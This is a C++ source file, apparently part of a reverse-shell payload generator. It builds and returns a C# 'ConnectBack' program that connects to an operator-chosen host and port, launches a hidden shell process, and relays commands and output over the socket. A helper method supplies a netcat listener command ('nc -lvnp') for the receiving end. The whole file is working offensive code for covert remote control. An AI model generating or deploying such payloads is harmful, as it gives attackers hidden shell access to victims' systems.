#include "C_Sharp_TCP_Client_Payload.h"
#include "../../listeners/ListenerFactory.h"

#include <sstream>
#include <string>

std::string CSharpTCPClientPayload::name() const {
return "c_sharp_tcp_client";
}

std::string CSharpTCPClientPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "using System;\n"
       << "using System.Text;\n"
       << "using System.IO;\n"
       << "using System.Diagnostics;\n"
       << "using System.ComponentModel;\n"
       << "using System.Linq;\n"
       << "using System.Net;\n"
       << "using System.Net.Sockets;\n\n\n"
       << "namespace ConnectBack\n"
       << "{\n"
       << "     public class Program\n"
       << "     {\n"
       << "          static StreamWriter streamWriter;\n\n"
       << "          public static void Main(string[] args)\n"
       << "          {\n"
       << "               using(TcpClient client = new TcpClient(\"" << opts.host << "\", " << opts.port << "))\n"
       << "               {\n"
       << "                    using(Stream stream = client.GetStream())\n"
       << "                    {\n"
       << "                         using(StreamReader rdr = new StreamReader(stream))\n"
       << "                         {\n"
       << "                              streamWriter = new StreamWriter(stream);\n\n"
       << "                              StringBuilder strInput = new StringBuilder();\n\n"
       << "                              Process p = new Process();\n"
       << "                              p.StartInfo.FileName = \"" << opts.interpreter << "\";\n"
       << "                              p.StartInfo.CreateNoWindow = true;\n"
       << "                              p.StartInfo.UseShellExecute = false;\n"
       << "                              p.StartInfo.RedirectStandardOutput = true;\n"
       << "                              p.StartInfo.RedirectStandardInput = true;\n"
       << "                              p.StartInfo.RedirectStandardError = true;\n"
       << "                              p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n"
       << "                              p.Start();\n"
       << "                              p.BeginOutputReadLine();\n\n"
       << "                              while(true)\n"
       << "                              {\n"
       << "                                   strInput.Append(rdr.ReadLine());\n"
       << "                                   //strInput.Append(\"n\");\n"
       << "                                   p.StandardInput.WriteLine(strInput);\n"
       << "                                   strInput.Remove(0, strInput.Length);\n"
       << "                              }\n"
       << "                         }\n"
       << "                    }\n"
       << "               }\n"
       << "          }\n\n"
       << "          private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outline)\n"
       << "     {\n"
       << "         StringBuilder strOutput = new StringBuilder();\n\n"
       << "         if (!String.IsNullOrEmpty(outline.Data))\n"
       << "         {\n"
       << "             try\n"
       << "             {\n"
       << "                  strOutput.Append(outline.Data);\\n"
       << "                  streamWriter.WriteLine(strOutput);\n"
       << "                  streamWriter.Flush();\n"
       << "              }\n"
       << "              catch (Exception err) { }\n"
       << "         }\n"
       << "     }\n"
       << "     }\n"
       << "}\n";
    return ss.str();
}

std::string CSharpTCPClientPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}